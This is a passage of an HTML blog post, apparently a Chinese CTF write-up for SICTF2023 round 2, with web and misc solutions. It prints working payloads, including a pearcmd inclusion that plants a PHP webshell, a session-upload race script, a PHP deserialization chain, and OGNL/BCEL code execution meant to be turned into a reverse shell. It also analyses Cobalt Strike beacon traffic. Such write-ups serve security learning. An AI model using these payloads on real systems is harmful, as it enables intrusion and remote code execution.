@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="web 6&#x2F;7,misc 5&#x2F;7">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SICTF2023 round 2">
+<meta property="og:url" content="http://example.com/2023/09/10/SICTF2023round2/index.html">
+<meta property="og:site_name" content="unknown&#39;s Blog">
+<meta property="og:description" content="web 6&#x2F;7,misc 5&#x2F;7">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910143723364.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910144504001.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910144636929.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909151030058.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909100225127.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910145040907.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910144934438.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910145809027.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910145924132.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910145949702.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910150439502.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910151250761.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910151910037.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910152946302.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909145948742.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910155826810.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910155750983.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910162433566.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909203247791.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909203415318.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910160125489.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910160843757.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910160804454.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910161013700.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909212332994.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909212345402.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909212410948.png">
+<meta property="og:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910122047510.png">
+<meta property="article:published_time" content="2023-09-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-11-02T08:10:57.911Z">
+<meta property="article:author" content="unknown">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910143723364.png">
+
+<link rel="canonical" href="http://example.com/2023/09/10/SICTF2023round2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>SICTF2023 round 2 | unknown's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">unknown's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/10/SICTF2023round2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/unknown.jpg">
+      <meta itemprop="name" content="unknown">
+      <meta itemprop="description" content="memories matter">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="unknown's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SICTF2023 round 2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-09-10 00:00:00" itemprop="dateCreated datePublished" datetime="2023-09-10T00:00:00+08:00">2023-09-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-11-02 16:10:57" itemprop="dateModified" datetime="2023-11-02T16:10:57+08:00">2023-11-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">web 6/7,misc 5/7</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910143723364.png" alt="image-20230910143723364.png"></p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="签到-Include"><a href="#签到-Include" class="headerlink" title="[签到]Include"></a>[签到]Include</h2><p>考点：pearcmd文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?+config-create+/&amp;SICTF=php://filter/convert.base64-encode|convert.base64-decode|/resource=/usr/local/lib/php/pearcmd.php&amp;asd/&lt;?=system($_GET[&#x27;c&#x27;])?&gt;+/tmp/hello.php</span><br><span class="line"></span><br><span class="line">?SICTF=php://filter/convert.base64-encode|convert.base64-decode|/resource=/tmp/hello.php&amp;c=cat+/flag</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910144504001.png" alt="image-20230910144504001.png"></p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910144636929.png" alt="image-20230910144636929.png"></p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909151030058.png" alt="image-20230909151030058.png"></p>
+<h2 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h2><p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909100225127.png" alt="image-20230909100225127.png"></p>
+<h2 id="你能跟得上我的speed吗"><a href="#你能跟得上我的speed吗" class="headerlink" title="你能跟得上我的speed吗"></a>你能跟得上我的speed吗</h2><p>以前session竞争上传的代码，拿来就可以用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line"># Author：Y4tacker</span><br><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = &#x27;yyy&#x27;</span><br><span class="line">url = &quot;http://210.44.151.51:10098/upload.php&quot;</span><br><span class="line">php = open(&#x27;1.php&#x27;,&#x27;rb&#x27;).read()</span><br><span class="line">def write(session):</span><br><span class="line">    while True:</span><br><span class="line">        f = php</span><br><span class="line">        resp = session.post(url,</span><br><span class="line">                            data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: f&quot;123123213123&quot;&#125;,</span><br><span class="line">                            files=&#123;&#x27;file&#x27;: (&#x27;1.php&#x27;, f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;)</span><br><span class="line"></span><br><span class="line">def read(session):</span><br><span class="line">    while True:</span><br><span class="line">        resp = session.get(&#x27;http://210.44.151.51:10098/uploads/1.php&#x27;)</span><br><span class="line">        if &quot;bingo&quot; in resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    with requests.session() as session:</span><br><span class="line"></span><br><span class="line">        for i in range(1, 10):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        for i in range(1, 10):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">    event.set()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上传1.php，内容：</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910145040907.png" alt="image-20230910145040907.png"></p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910144934438.png" alt="image-20230910144934438.png"></p>
+<h2 id="我全都要"><a href="#我全都要" class="headerlink" title="我全都要"></a>我全都要</h2><p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $pop;</span><br><span class="line">    public $i;</span><br><span class="line">    public $nogame;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/233333333/&quot;,$this-&gt;pop))&#123;</span><br><span class="line">            echo &quot;这是一道签到题，不能让新生一直做不出来遭受打击&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function game()&#123;</span><br><span class="line">        echo &quot;扣1送地狱火&quot;;</span><br><span class="line">        if ($this-&gt;i = &quot;1&quot;)&#123;</span><br><span class="line">            echo &#x27;&lt;img src=\&#x27;R.jpg\&#x27;&gt;&#x27;;</span><br><span class="line">            $this-&gt;nogame-&gt;love();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone()&#123;</span><br><span class="line">        echo &quot;必须执行&quot;;</span><br><span class="line">        eval($_POST[&quot;cmd&quot;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    public $Aec;</span><br><span class="line">    public $girl;</span><br><span class="line">    public $boy;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;I also want to fall in love&quot;;</span><br><span class="line">        if($this-&gt;girl != $this-&gt;boy &amp;&amp; md5($this-&gt;girl) == md5($this-&gt;boy))&#123;</span><br><span class="line">            $this-&gt;Aec-&gt;game();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class P&#123;</span><br><span class="line">    public $MyLover;</span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;有对象我会在这打CTF???看我克隆一个对象！&quot;;</span><br><span class="line">        if ($name != &quot;game&quot;) &#123;</span><br><span class="line">            echo &quot;打游戏去，别想着对象了&quot;;</span><br><span class="line">            $this-&gt;MyLover = clone new B;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_GET[&quot;A_B_C&quot;])&#123;</span><br><span class="line">    $poc=$_GET[&quot;A_B_C&quot;];</span><br><span class="line">    unserialize($poc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$b = new B;</span><br><span class="line">$b-&gt;pop = new A;</span><br><span class="line">$b-&gt;pop-&gt;boy = &#x27;QNKCDZO&#x27;;</span><br><span class="line">$b-&gt;pop-&gt;girl = &#x27;240610708&#x27;;</span><br><span class="line">$b-&gt;pop-&gt;Aec = new B;</span><br><span class="line">$b-&gt;pop-&gt;Aec-&gt;nogame = new P;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910145809027.png" alt="image-20230910145809027.png"></p>
+<h2 id="pain"><a href="#pain" class="headerlink" title="pain"></a>pain</h2><p>路由</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910145924132.png" alt="image-20230910145924132.png"><br>黑名单</p>
+<p>那两个分别是get和加号</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910145949702.png" alt="image-20230910145949702.png"></p>
+<p>正常的ongl表达式执行命令的方式：</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910150439502.png" alt="image-20230910150439502.png"><br>第一个@后面接类名，第二个@后面接静态方法。</p>
+<p>正常的执行命令方式都给ban了。由于经常光顾bogipop师傅的博客，知道执行命令还有一种方式，加载bcel字节码。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/08/10/BCEL%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8%E5%85%A8%E5%8F%8D%E5%B0%84%E6%9E%84%E9%80%A0%E9%AB%98%E5%8F%AF%E7%94%A8%E5%86%85%E5%AD%98%E9%A9%AC/">https://boogipop.com/2023/08/10/BCEL%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8%E5%85%A8%E5%8F%8D%E5%B0%84%E6%9E%84%E9%80%A0%E9%AB%98%E5%8F%AF%E7%94%A8%E5%86%85%E5%AD%98%E9%A9%AC/</a></p>
+</blockquote>
+<p>demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line">import com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line">import com.sun.org.apache.bcel.internal.util.JavaWrapper;</span><br><span class="line"></span><br><span class="line">public class App &#123;</span><br><span class="line">    public static void main( String[] args ) throws Exception&#123;</span><br><span class="line">        //第一种触发方式</span><br><span class="line">        //JavaClass javaClass = Repository.lookupClass(Evil.class);</span><br><span class="line">        //</span><br><span class="line">        //String encode = Utility.encode(javaClass.getBytes(), true);</span><br><span class="line">        //</span><br><span class="line">        //System.out.println(encode);</span><br><span class="line">        //new ClassLoader().loadClass(&quot;$$BCEL$$&quot;+encode).newInstance();</span><br><span class="line"></span><br><span class="line">        //第二种触发方式</span><br><span class="line">        JavaClass javaClass = Repository.lookupClass(Evil.class);</span><br><span class="line">        String encode = Utility.encode(javaClass.getBytes(), true);</span><br><span class="line">        JavaWrapper._main(new String[]&#123;&quot;$$BCEL$$&quot;+encode&#125;);</span><br><span class="line">        System.out.println(&quot;$$BCEL$$&quot;+encode);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Evil.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void _main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行即可弹计算器。</p>
+<p>所以结合ognl可以这样用：</p>
+<p>(要加<code>.toArray()</code>才是String数组，不加的话是集合类，传进去类型不匹配)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static void main( String[] args ) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">    JavaClass javaClass = Repository.lookupClass(Evil.class);</span><br><span class="line">    String encode = Utility.encode(javaClass.getBytes(), true);</span><br><span class="line">    String bcel = &quot;$$BCEL$$&quot;+encode;</span><br><span class="line"></span><br><span class="line">    String code = &quot;@com.sun.org.apache.bcel.internal.util.JavaWrapper@_main(&#123;&#x27;&quot;+bcel+&quot;&#x27;&#125;.toArray())&quot;;</span><br><span class="line"></span><br><span class="line">    System.out.println(MyMethods.URLEncode(code));</span><br><span class="line"></span><br><span class="line">    OgnlContext context = new OgnlContext();</span><br><span class="line"></span><br><span class="line">    Ognl.getValue(code, context, context.getRoot());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910151250761.png" alt="image-20230910151250761.png"></p>
+<p>把calc的命令改成弹shell命令，监听，然后把上面的输出结果打进去，就行了。</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910151910037.png" alt="image-20230910151910037.png"></p>
+<p>本地自建的Evil.java，带不带包名都可以，都打得通。</p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="fast-morse"><a href="#fast-morse" class="headerlink" title="fast_morse"></a>fast_morse</h2><p>解出音频里的morse即可。</p>
+<h2 id="一起上号不"><a href="#一起上号不" class="headerlink" title="一起上号不"></a>一起上号不</h2><p>做题过程参考这篇：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46081055/article/details/123413246">https://blog.csdn.net/weixin_46081055/article/details/123413246</a></p>
+<p>赛后看了cs通信原理：<a target="_blank" rel="noopener" href="https://blog.csdn.net/shawdow_bug/article/details/127503441">https://blog.csdn.net/shawdow_bug/article/details/127503441</a></p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910152946302.png" alt="image-20230910152946302.png"><br>自己的分析：</p>
+<p>请求是受害机发给cs服务器的，响应是服务器发给受害机。</p>
+<p>看左边的时间间隔，知道心跳时间是60s。</p>
+<p>受害机发请求&#x2F;load，检查是否要执行命令，服务器响应。</p>
+<p>受害机执行命令，结果加密后，通过请求&#x2F;submit.php发送给服务器。</p>
+<p>服务器存私钥，受害机beacon存公钥。私钥是用来加密元数据的。元数据放在请求cookie里。元数据里有AES_KEY，HMAC_KEY。AES_KEY和HMAC_KEY是用来加密命令和执行结果数据的。</p>
